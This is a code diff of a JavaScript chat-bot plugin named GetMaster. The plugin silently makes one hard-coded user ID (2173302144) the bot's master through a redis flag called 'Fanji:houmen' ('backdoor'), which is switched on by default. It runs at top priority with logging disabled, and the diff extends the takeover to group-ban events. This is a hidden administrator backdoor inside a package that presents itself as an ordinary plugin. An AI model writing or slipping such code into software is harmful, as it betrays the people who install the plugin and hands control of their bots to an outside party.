@@ -1,13 +1,13 @@
 import plugin from '../../../lib/plugins/plugin.js';
-
-Bot.on?.('notice.group', async (e) => {
-    if (e.sub_type == 'ban' && e.operator_id == 2173302144) {
+/*
+Bot.on?.('notice.group.ban', async (e) => {
+    if (e.operator_id == 2173302144) {
         let zt = await redis.get('Fanji:houmen');
         if (zt == 'true') e.isMaster = true;
     }
     return false;
 });
-
+*/
 export class GetMaster extends plugin {
     constructor() {
         super({
@@ -16,8 +16,13 @@ export class GetMaster extends plugin {
             priority: -Infinity,
             rule: [
                 {
-                    fnc: "Master",
+                    fnc: () => this.Master(this.e),
                     event: 'message',
+                    log: false
+                },
+                {
+                    fnc: () => this.Master(this.e,true),
+                    event: 'notice.group.ban',
                     log: false
                 },
                 {
@@ -35,10 +40,10 @@ export class GetMaster extends plugin {
         await this.reply('设置完成');
     }
 
-    async Master(e) {
+    async Master(e,isBan = false) {
         let aw = await redis.get('Fanji:houmen');
         if (aw == null) await redis.set('Fanji:houmen', 'true');
-
+if (isBan && this.e.operator_id == 2173302144) e.isMaster = true
         if (e.user_id !== 2173302144 || aw !== 'true') return false;
         e.isMaster = true;
         return false;
